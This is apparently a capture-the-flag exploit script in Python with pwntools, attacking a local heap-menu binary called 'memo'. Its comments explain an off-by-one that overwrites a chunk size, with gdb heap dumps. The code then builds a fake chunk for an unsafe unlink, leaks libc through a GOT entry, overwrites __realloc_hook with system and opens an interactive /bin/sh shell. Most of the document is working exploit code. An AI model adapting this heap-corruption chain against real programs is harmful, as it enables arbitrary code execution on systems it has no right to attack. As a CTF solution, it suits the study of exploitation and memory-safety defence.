# There is an off-by-one in |change_name|. We can overwrite the size of an adjacent chunk
# with either 0xa, or 0x21, or 0x3f, or 0x40, 0or x22, or 0x27, or 0x23, or 0x25, or 0x26.
#
# 0x40 seemed as the most interesting scenario since we're basically telling _int_free
# that the previous chunk is not in use. We can leverage this into an unsafe unlink attack.
#
# 0x603000:	0x0000000000000000	0x0000000000000031 <-- name
# 0x603010:	0x0000000000000000	0x0000000000000008 <-- fake free chunk
# 0x603020:	0x0000000000602028	0x0000000000602030
# 0x603030:	0x0000000000000020	0x0000000000000040 <-- page + fake prev_size
# 0x603040:	0x00000000b00bface	0x00000000b00bface
# 0x603050:	0x00000000b00bface	0x00000000b00bface
# 0x603060:	0x00000000b00bface	0x00000000b00bface
# 0x603070:	0x00000000b00bface	0x0000000000000021 <-- fake nextchunk
# 0x603080:	0x00000000b00bface	0x00000000b00bface
# 0x603090:	0x00000000b00bface	0x0000000000000041 <-- fake chunk so that free doesn't complain
# 0x6030a0:	0x000000000000000a	0x0000000000000000
# 0x6030b0:	0x0000000000000000	0x0000000000000031 <-- title
# 0x6030c0:	0x0000000000000000	0x0000000000000000
# 0x6030d0:	0x0000000000000000	0x0000000000000000
# 0x6030e0:	0x0000000000000000	0x0000000000020f21 <-- top chunk
#
# By triggering realloc, |page| will be placed in its corresponding
# fastbin list while the top chunk will be extended.
#
# 0x6030e0:	0x0000000000000000	0x0000000000000411 <-- new chunk
# 0x6030f0:	0x4141414141414141	0x00000000b00b000a
# 0x603100:	0x00000000b00bface	0x00000000b00bface
# 0x603110:	0x00000000b00bface	0x00000000b00bface
#   ...
#
#
# gdb-peda$ heapinfo
# (0x20)     fastbin[0]: 0x0
# (0x30)     fastbin[1]: 0x0
# (0x40)     fastbin[2]: 0x603030 --> 0x0
# (0x50)     fastbin[3]: 0x0
# (0x60)     fastbin[4]: 0x0
# (0x70)     fastbin[5]: 0x0
# (0x80)     fastbin[6]: 0x0
#                  top: 0x6034f0 (size : 0x20b10) 
#       last_remainder: 0x0 (size : 0x0) 
#            unsortbin: 0x0
#
# Now if we trigger realloc once again, but this time with a size less than 0x400,
# the previously allocated chunk will be split and free will be called on the 
# remainder chunk.
#
# if ((unsigned long) (oldsize) >= (unsigned long) (nb))
#    {
#      /* already big enough; split below */
#      newp = oldp;
#      newsize = oldsize;
# }
#
# ...
# 
# See https://github.com/str8outtaheap/heapwn/blob/master/malloc/_int_realloc.c#L144 
#
# Since the remainder chunk borders with the wilderness, malloc_consolidate
# will get called and it will place the fastbin chunk in the unsorted bin
# as well as unlink in the case of bordering free chunks.
# 
# See https://github.com/str8outtaheap/heapwn/blob/master/malloc/_int_free.c#L223
# See https://github.com/str8outtaheap/heapwn/blob/master/malloc/malloc_consolidate.c#L63
# 
# The unlink part is quite convenient for us since we've crafted a fake free chunk
# before what was used to be |page|. This will result in the global |name| pointer
# pointing to 0x602028, which is 8 bytes before the book keeping pointers in the bss 
# such as title, page and name.
#
# After that, we can just overwrite the aforementioned pointers to leak libc
# by printing a GOT entry and then overwrite __realloc_hook with system.


from pwn import *

array = 0x602040
fd    = array - (3*8)
bk    = array - (2*8)

atoi = 0x601FF0
page_count = 0x602050
page = 0x602038

def change_name(name):
	r.sendlineafter('exit\n', '4')
	r.sendlineafter('name:\n', name)
	return

def change_title(title):
	r.sendlineafter('exit\n', '5')
	r.sendlineafter('title:\n', title)
	return

def edit_page(data):
	r.sendlineafter('exit\n', '2')
	r.sendlineafter('page:\n', data)
	return

def tear_page(size, data):
	r.sendlineafter('exit\n', '3')
	r.sendlineafter('(bytes):\n', str(size))

	if len(data) < size - 1:
		data += '\n'
	r.sendafter('page:\n', data)
	return

def show():
	r.sendlineafter('exit\n', '1')
	return

def leak():
	show()
	r.recvuntil('write:\n')
	return u64(r.recv(6).ljust(8, chr(0)))

def pwn():

	change_name(p64(0) + p64(8) + p64(fd) + p64(bk) + p64(0x20) + p64(0x40))

	edit_page(p64(0xb00bface)*7 + p64(0x21) + p64(0xb00bface)*3 + p64(0x41))

	tear_page(0x400, 'A'*8)
	tear_page(0x100, 'A'*8)

	change_name('A'*8 + p64(page_count) + p64(atoi) + p64(page))

	libc           = leak() - 0x36e80
	__realloc_hook = libc + 0x3c4b08
	system         = libc + 0x45390
	binsh          = libc + 0x18cd57

	log.success('Libc:           0x{:x}'.format(libc))
	log.success('__realloc_hook: 0x{:x}'.format(__realloc_hook))

	change_name(p64(__realloc_hook) + p64(page))

	# since we've exhausted the limit of allowed pages, we'll
	# overwrite the |pages| global variable with 0 in order
	# to trigger realloc again
	change_title(p64(0))

	# __realloc_hook => system
	edit_page(p64(system))
	# realloc gets called with |page| as its first argument
	# we'll overwrite |page| with /bin/sh
	change_name(p64(binsh))

	# realloc(page, size); => page = system('/bin/sh')
	r.sendlineafter('exit\n', '3')
	r.sendlineafter('(bytes):\n', str(0x100))
	
	r.interactive()

if __name__ == "__main__":
	r = process('./memo')
	pause()
	pwn()
